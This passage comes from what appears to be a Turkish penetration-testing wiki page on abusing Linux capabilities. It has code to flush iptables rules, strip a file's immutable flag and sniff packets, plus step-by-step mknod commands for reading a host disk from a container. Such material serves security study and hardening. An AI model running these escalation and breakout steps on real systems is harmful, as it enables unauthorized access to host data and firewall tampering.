udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html), sahibine, açıkta bulunan network namespace'leri içindeki firewall ayarları, routing tabloları, socket izinleri ve network interface ayarları dahil olmak üzere **network yapılandırmalarını değiştirme** yetkisi verir. Ayrıca network interface'lerinde **promiscuous mode**'u etkinleştirmeyi ve namespace'ler genelinde packet sniffing yapılmasını sağlar.<sup>[[14]](#references)</sup>

**binary ile örnek**

**python binary**'sinin bu capability'lere sahip olduğunu varsayalım.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Bu capability, immutable ve append-only gibi inode flag'lerinin değiştirilmesine izin verir.** Daha geniş bir privilege escalation yetkisi doğrudan sağlamaz.<sup>[[14]](#references)</sup>

**binary ile örnek**

Bir dosyanın immutable olduğunu ve python'ın bu capability'ye sahip olduğunu tespit ederseniz, **immutable attribute'unu kaldırabilir ve dosyayı değiştirilebilir hâle getirebilirsiniz:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
`FS_IOC_GETFLAGS` ve `FS_IOC_SETFLAGS` işlemleri inode flag'lerini okur ve günceller; `FS_IMMUTABLE_FL`, bu örnekte temizlenen immutable flag'idir.<sup>[[27]](#references)</sup>

> [!TIP]
> Genellikle bu immutable attribute şu şekilde ayarlanır ve kaldırılır:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `chroot(2)` system call'unun çalıştırılmasını etkinleştirir; bu da bilinen zafiyetler aracılığıyla `chroot(2)` ortamlarından escape edilmesine olanak tanıyabilir.<sup>[[11]](#references)[[14]](#references)</sup>

- [Various chroot solutions'dan nasıl çıkılır](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `LINUX_REBOOT_CMD_RESTART2` gibi komutlar da dahil olmak üzere, system restart'ları için `reboot(2)` system call'unun çalıştırılmasına izin verir; ayrıca yeni veya imzalı crash kernel'larını yüklemek için sırasıyla `kexec_load(2)` ve Linux 3.17'den itibaren `kexec_file_load(2)` kullanımını etkinleştirir.<sup>[[14]](#references)</sup>

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html), Linux 2.6.37'de daha geniş kapsamlı **CAP_SYS_ADMIN**'den ayrılmış ve özellikle `syslog(2)` call'unu kullanma yetkisi sağlamıştır. Bu capability, kernel address'lerinin `kptr_restrict` ayarı 1 olduğunda `/proc` ve benzer interface'ler üzerinden görüntülenmesini etkinleştirir; bu ayar kernel address'lerinin dışarı açılmasını kontrol eder. Linux 2.6.39'dan beri `kptr_restrict` için varsayılan değer 0'dır; bu, kernel address'lerinin açıkta olduğu anlamına gelir, ancak birçok distribution güvenlik nedeniyle bu değeri 1'e (address'leri uid 0 dışındaki herkesten gizle) veya 2'ye (address'leri her zaman gizle) ayarlar.<sup>[[14]](#references)</sup>

Ek olarak, `dmesg_restrict` 1 olarak ayarlandığında **CAP_SYSLOG**, `dmesg` output'una erişilmesine izin verir. Bu değişikliklere rağmen **CAP_SYS_ADMIN**, geçmişten gelen uyumluluk nedeniyle `syslog` işlemlerini gerçekleştirme yetkisini korur.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `mknod` system call'unun regular file'lar, FIFO'lar (named pipe'lar) veya UNIX domain socket'leri oluşturmanın ötesindeki işlevlerini genişletir. Özellikle aşağıdakiler dahil olmak üzere special file'ların oluşturulmasına izin verir:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Terminal gibi device'lar olan character special file'lar.
- **S_IFBLK**: Disk gibi device'lar olan block special file'lar.

Bu capability, character veya block device'ları da dahil olmak üzere device file'ları oluşturması gereken process'ler için kullanışlıdır.<sup>[[14]](#references)</sup>

Docker'ın documented default capability set'ine dahildir; her deployment'ın aynı default'ları kullandığını varsaymak yerine gerçek runtime configuration'ı doğrulayın ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Bu capability, aşağıdaki koşullar altında host üzerinde privilege escalation'ların (full disk read üzerinden) gerçekleştirilmesine izin verir:<sup>[[7]](#references)</sup>

1. Host'a initial access sahibi olmak (Unprivileged).
2. Container'a initial access sahibi olmak (Privileged (EUID 0) ve effective `CAP_MKNOD`).
3. Host ve container aynı user namespace'i paylaşmalıdır.

**Container'da Block Device Oluşturma ve Erişme Adımları:**

1. **Standard User olarak Host üzerinde:**

- `id` ile mevcut user ID'nizi belirleyin; örneğin, `uid=1000(standarduser)`.
- Target device'ı belirleyin; örneğin, `/dev/sdb`.

2. **`root` olarak Container'ın içinde:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Host'a Geri Dönüş:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Bu yaklaşım, cihaz, namespace'ler ve izinler açıklandığı şekilde yapılandırıldığında standart kullanıcının container üzerinden `/dev/sdb` içindeki verilere erişmesine ve bunları potansiyel olarak okumasına olanak tanır.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Dosya capabilities özelliğine sahip güncel Linux kernel'lerinde **`CAP_SETPCAP`**, bir thread'in bounding set'indeki capabilities'leri inheritable set'ine eklemesine, bounding set'inden capabilities'leri kaldırmasına ve securebits değerlerini değiştirmesine olanak tanır. Bir process'in capabilities'leri başka bir process'e rastgele vermesine izin vermez; bu davranış yalnızca file-capability desteği olmayan 2.6.25 öncesi kernel'ler için geçerlidir.<sup>[[14]](#references)</sup>

`capset()` system call'u bir thread'in kendi effective, permitted ve inheritable set'lerini değiştirebilir; ancak yeni permitted set mevcut permitted set'in dışındaki capabilities'leri içeremez ve inheritable güncellemeleri kernel kısıtlamalarına tabi olmaya devam eder.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Linux capabilities privilege escalation lab'ları](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Linux'ta Privilege Escalation](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux Container Temelleri: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Linux Capabilities'ten Yararlanma](https://www.linuxjournal.com/article/5737)
- [6] [Aşırı Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [/proc/pid/root üzerinden mount namespace'lerine erişimin kötüye kullanılması](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Neden Varlar ve Nasıl Çalışırlar](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Linux'ta Capabilities'leri Anlamak](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [ptrace izinliyse seccomp'u bypass etmeye yönelik PoC](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Çeşitli chroot çözümlerinden nasıl çıkılır](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - Sebastian Krahmer tarafından yazılan orijinal CAP_DAC_READ_SEARCH Docker breakout exploit'i](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Docker breakout exploit analizi](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux manual sayfası](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux manual sayfası](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux manual sayfası](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu Manpage](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux manual sayfası](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Container'ları çalıştırma - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux manual sayfası](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux manual sayfası](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux manual sayfası](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux manual sayfası](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux manual sayfası](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux manual sayfası](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
